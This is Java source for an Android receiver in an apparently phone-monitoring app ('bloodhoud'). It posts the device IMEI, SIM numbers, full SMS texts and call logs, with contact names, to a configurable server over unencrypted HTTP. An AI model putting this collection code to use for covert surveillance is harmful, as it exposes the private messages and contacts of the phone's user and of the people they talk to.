package it.cf.bloodhoud.client.android.receiver;

import it.cf.bloodhoud.client.android.App;
import it.cf.bloodhoud.client.android.Utils;
import it.cf.bloodhoud.client.android.model.Call;
import it.cf.bloodhoud.client.android.model.Phone;
import it.cf.bloodhoud.client.android.model.Sms;
import it.cf.bloodhoud.client.android.serviceApp.RepositoryLocalSQLLite;

import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Scanner;

import org.apache.commons.lang3.StringUtils;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.SystemClock;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

@SuppressLint("DefaultLocale") public class SendDataToServerReceiver extends BroadcastReceiver
    {
        static private final Logger LOG = LoggerFactory.getLogger(SendDataToServerReceiver.class);

        @Override
        public void onReceive(final Context context, final Intent intent)
            {
                LOG.debug("Intent received: {}", intent.getAction());
                try
                    {
                        new SendDataToServer(context).execute();
                    }
                catch (final Exception e)
                    {
                        LOG.error(e.getMessage());
                    }
            }

        private class SendDataToServer extends AsyncTask<Void, Void, Void>
            {
                private final SharedPreferences prefs;
                private final Context           context;

                private static final String     UTF    = "UTF-8";

                private ObjectMapper            mapper = new ObjectMapper();
                private RepositoryLocalSQLLite  repository;

                public SendDataToServer(Context context)
                    {
                        this.prefs = context.getSharedPreferences(App.APP_FILE_PREFERENCES, Context.MODE_PRIVATE);
                        this.context = context;
                        repository = RepositoryLocalSQLLite.getRepository(context);
                    }

                @Override
                protected Void doInBackground(Void... params)
                    {
                        LOG.debug(">>>>>>>>>> START SEND DATA TO SERVER");
                        if (isNetworkAvailable())
                            {
                                LOG.debug("Network available");

                                // HTTP connection reuse which was buggy pre-froyo
                                if (Integer.parseInt(Build.VERSION.SDK) < Build.VERSION_CODES.FROYO)
                                    {
                                        System.setProperty("http.keepAlive", "false");
                                    }

                                String serverUrl = buildServerUrl();
                                LOG.debug("Server url {}", serverUrl);

                                String urlForSendPhone = buildUrlForSendPhoneToServer(serverUrl);
                                LOG.debug("Url for send phone {}", urlForSendPhone);
                                sendPhoneToServer(urlForSendPhone);

                                String urlForSendSms = buildUrlForSendSmsToServer(serverUrl);
                                LOG.debug("Url for send sms {}", urlForSendSms);
                                sendSmsToServer(urlForSendSms);

                                String urlForSendCall = buildUrlForSendCallToServer(serverUrl);
                                LOG.debug("Url for send call {}", urlForSendCall);
                                sendCallToServer(urlForSendCall);
                                
                            }
                        else
                            {
                                LOG.debug("Network NOT available");
                            }
                        LOG.debug("END SEND DATA TO SERVER <<<<<<<<<<");
                        return null;
                    }

                private String buildServerUrl()
                    {
                        String server = prefs.getString(App.APP_PROP_NAME_SERVER, App.DEFAULT_SERVER);
                        return "http://" + server;
                    }

                private String buildUrlForSendPhoneToServer(String serverUrl)
                    {
                        return serverUrl + "/phones";
                    }

                private String buildUrlForSendSmsToServer(String serverUrl)
                    {
                        String deviceId = Utils.getDeviceId(context);
                        return serverUrl + "/phones/phone-" + deviceId + "/sms";
                    }

                private String buildUrlForSendCallToServer(String serverUrl)
                    {
                        String deviceId = Utils.getDeviceId(context);
                        return serverUrl + "/phones/phone-" + deviceId + "/call";
                    }

                private void sendPhoneToServer(String urlForSendPhone)
                    {
                        LOG.debug(">>>>> Send PHONE to server");
                        Phone phone;
                        try
                            {
                                String deviceId = Utils.getDeviceId(context);
                                phone = repository.getPhone(deviceId);
                                if (phone == null)
                                    {
                                        LOG.warn("Il phone di deviceId {} non presente nel local DB. Lo inserisco.", deviceId);

                                        String deviceModel = Utils.getDeviceName();
                                        phone = new Phone(deviceId, deviceModel);
                                        if (repository.writePhone(phone) > 0){
                                            LOG.debug("Il phone di deviceId {} inserito nel DB. {}", deviceId, phone.toString());
                                        }
                                        else{
                                            LOG.error("Il phone di deviceId {} NON è stato inserito nel DB.", deviceId);
                                        }
                                    }
                                if (phone.getServerSyncro() < 1)
                                    {
                                        LOG.debug("Sending {}", phone);

                                        HttpURLConnection connection = openNewConnection(urlForSendPhone);
                                        String postParameters = buildPostParameter(phone);
                                        LOG.debug("Parameters for POST {}", postParameters);
                                        String response = senDataToServerWithPost(connection, postParameters);
                                        LOG.debug("Responce from server: {}", response);

                                        String remoteId = parseServerResponseAndGetRemoteId(response);
                                        if (StringUtils.isBlank(remoteId))
                                            {
                                                LOG.warn("Problem on the server, remote id is empty");
                                            }
                                        else
                                            {
                                                repository.markLikeSendedToServer(phone, remoteId);
                                                LOG.info("Phone sended to server. RemoteId =  {}. {}", remoteId, phone.toString());
                                            }
                                    }
                                else
                                    {
                                        LOG.debug("Phone già inviato al server. {}", phone);
                                    }

                            }
                        catch (Exception e)
                            {
                                LOG.error(e.getMessage());
                            }
                        LOG.debug("Send PHONE to server <<<<<<<");
                    }

                private void sendSmsToServer(String urlForSendSms)
                    {
                        LOG.debug(">>>>> Send SMS to server");
                        List<Sms> messages;
                        try
                            {
                                messages = repository.getSmsNotAlreadySendedToServer();
                                LOG.debug("Num SMS Message to send = {}", String.valueOf(messages.size()));

                                int index = 0;
                                for (Sms sms : messages)
                                    {
                                        LOG.debug("{} sending {}", index++, sms.toString());

                                        HttpURLConnection connection = openNewConnection(urlForSendSms);
                                        String postParameters = buildPostParameter(sms);
                                        LOG.debug("Parameters for POST {}", postParameters);
                                        String response = senDataToServerWithPost(connection, postParameters);
                                        LOG.debug("Responce from server: {}", response);

                                        String remoteId = parseServerResponseAndGetRemoteId(response);
                                        if (StringUtils.isBlank(remoteId))
                                            {
                                                LOG.warn("Problem on the server, remote id is empty");
                                            }
                                        else
                                            {
                                                repository.markLikeSendedToServer(sms, remoteId);
                                                LOG.info("Sms sended to server. RemoteId =  {}, {}", remoteId, sms.toString());
                                            }
                                        
                                        SystemClock.sleep(300);
                                    }
                            }
                        catch (Exception e)
                            {
                                LOG.error(e.getMessage());
                            }
                        LOG.debug("Send SMS to server <<<<<");
                    }

                private void sendCallToServer(String urlForSendCall)
                    {
                        LOG.debug(">>>>> Send CALL to server");
                        List<Call> messages;
                        try
                            {
                                messages = repository.getCallNotAlreadySendedToServer();
                                LOG.debug("Num SMS Message to send = {}", String.valueOf(messages.size()));

                                int index = 0;
                                for (Call call : messages)
                                    {
                                        LOG.debug("{} sending {}", index++, call.toString());

                                        HttpURLConnection connection = openNewConnection(urlForSendCall);
                                        String postParameters = buildPostParameter(call);
                                        LOG.debug("Parameters for POST {}", postParameters);
                                        String response = senDataToServerWithPost(connection, postParameters);
                                        LOG.debug("Responce from server: {}", response);

                                        String remoteId = parseServerResponseAndGetRemoteId(response);
                                        if (StringUtils.isBlank(remoteId))
                                            {
                                                LOG.warn("Problem on the server, remote id is empty");
                                            }
                                        else
                                            {
                                                repository.markLikeSendedToServer(call, remoteId);
                                                LOG.info("Call sended to server. RemoteId =  {}. {}", remoteId, call.toString());
                                            }
                                        
                                        SystemClock.sleep(50);
                                    }
                            }
                        catch (Exception e)
                            {
                                LOG.error(e.getMessage());
                            }
                        LOG.debug("Send CALL to server <<<<<");
                    }

                private HttpURLConnection openNewConnection(String urlToConnect) throws IOException
                    {
                        // if you are using https, make sure to import java.net.HttpsURLConnection
                        URL url = new URL(urlToConnect);

                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        // set the output to true, indicating you are outputting(uploading) POST data
                        connection.setDoOutput(true);
                        connection.setReadTimeout(20000);
                        connection.setConnectTimeout(10000);
                        // once you set the output to true, you don't really need to set the request method to post, but I'm doing it anyway
                        connection.setRequestMethod("POST");
                        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        return connection;
                    }

                private String buildPostParameter(Phone phone) throws UnsupportedEncodingException
                    {
                        StringBuilder postParam = new StringBuilder();
                        // you need to encode ONLY the values of the parameters
                        // "imei=123456789012341&name=xxxxxxxx&phoneNumberSim1=xxxxx&phoneNumberSim1=xxxxx"
                        postParam.append("imei=").append(URLEncoder.encode(phone.getDeviceId(), UTF));
                        postParam.append("&");
                        postParam.append("name=").append(URLEncoder.encode(phone.getModelPhone(), UTF));
                        postParam.append("&");
                        postParam.append("phoneNumberSim1=").append(URLEncoder.encode(phone.getNumberSim1(), UTF));
                        postParam.append("&");
                        postParam.append("phoneNumberSim2=").append(URLEncoder.encode(phone.getNumberSim2(), UTF));
                        return postParam.toString();
                    }

                private String buildPostParameter(Sms sms) throws UnsupportedEncodingException
                    {
                        StringBuilder postParam = new StringBuilder();
                        // you need to encode ONLY the values of the parameters
                        // "direction=outgoing&phoneNumber=0123456789&timestamp=YYYY-MM-DDTHH:mm:ss.000Z&text=sms numero 1"
                        postParam.append("direction=").append(URLEncoder.encode(sms.getDirection().name().toLowerCase(Locale.US), UTF));
                        postParam.append("&");
                        postParam.append("phoneNumber=").append(URLEncoder.encode(sms.getPhoneNumber(), UTF));
                        postParam.append("&");
                        postParam.append("nameContact=").append(URLEncoder.encode(sms.getNameContact(), UTF));
                        postParam.append("&");
                        postParam.append("timestamp=").append(URLEncoder.encode(sms.getTimestampFormatted(), UTF));
                        postParam.append("&");
                        postParam.append("text=").append(URLEncoder.encode(sms.getText(), UTF));
                        return postParam.toString();
                    }

                private String buildPostParameter(Call call) throws UnsupportedEncodingException
                    {
                        StringBuilder postParam = new StringBuilder();
                        // you need to encode ONLY the values of the parameters

                        /*
                         * direction=outgoing/incoming phoneNumber=0123456789 timestampStart=YYYY-MM-DDTHH:mm:ss.000Z (UTC)
                         * timestampEnd=YYYY-MM-DDTHH:mm:ss.000Z (UTC) nameContact=xxxx state=xxxx duration=xx
                         */
                        postParam.append("direction=").append(URLEncoder.encode(call.getDirection().name().toLowerCase(), UTF));
                        postParam.append("&");
                        postParam.append("phoneNumber=").append(URLEncoder.encode(call.getPhoneNumber(), UTF));
                        postParam.append("&");
                        postParam.append("nameContact=").append(URLEncoder.encode(call.getNameContact(), UTF));
                        postParam.append("&");
                        postParam.append("timestampStart=").append(URLEncoder.encode(call.getTimestampStartCallFormatted(), UTF));
                        postParam.append("&");
                        postParam.append("timestampEnd=").append(URLEncoder.encode(call.getTimestampEndCallFormatted(), UTF));
                        postParam.append("&");
                        postParam.append("state=").append(URLEncoder.encode(call.getState().name().toLowerCase(), UTF));
                        postParam.append("&");
                        postParam.append("duration=").append(URLEncoder.encode(String.valueOf(call.getCallDurationSec()), UTF));
                        return postParam.toString();
                    }

                private String senDataToServerWithPost(HttpURLConnection connection, String postParameters) throws IOException
                    {
                        // Android documentation suggested that you set the length of the data you are sending to the server, BUT
                        // do NOT specify this length in the header by using conn.setRequestProperty("Content-Length", length);
                        // use this instead.
                        connection.setFixedLengthStreamingMode(postParameters.getBytes().length);
                        // send the POST out
                        PrintWriter out = new PrintWriter(connection.getOutputStream());
                        out.print(postParameters);
                        out.close();

                        // start listening to the stream
                        Scanner inStream = new Scanner(connection.getInputStream());
                        // process the stream and store it in StringBuilder
                        String response = "";
                        while (inStream.hasNextLine())
                            {
                                response += (inStream.nextLine());
                            }
                        inStream.close();
                        connection.disconnect();
                        return response;
                    }

                private String parseServerResponseAndGetRemoteId(String response) throws JsonParseException, JsonMappingException, IOException
                    {
                        // parsing JSON server response
                        @SuppressWarnings("unchecked")
                        Map<String, Object> responseData = mapper.readValue(response, Map.class);
                        String timeRecord = (String) responseData.get("timeRecord");
                        String serverId = (String) responseData.get("_id");

                        LOG.debug("Responce: timeRecord = {}, serverId = {}", timeRecord, serverId);

                        return serverId;
                    }

                public boolean isNetworkAvailable()
                    {
                        ConnectivityManager cm = (ConnectivityManager) this.context.getSystemService(Context.CONNECTIVITY_SERVICE);
                        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
                        // if no network is available networkInfo will be null otherwise check if we are connected
                        if (networkInfo != null && networkInfo.isConnected())
                            {
                                return true;
                            }
                        return false;
                    }
            }//

    }
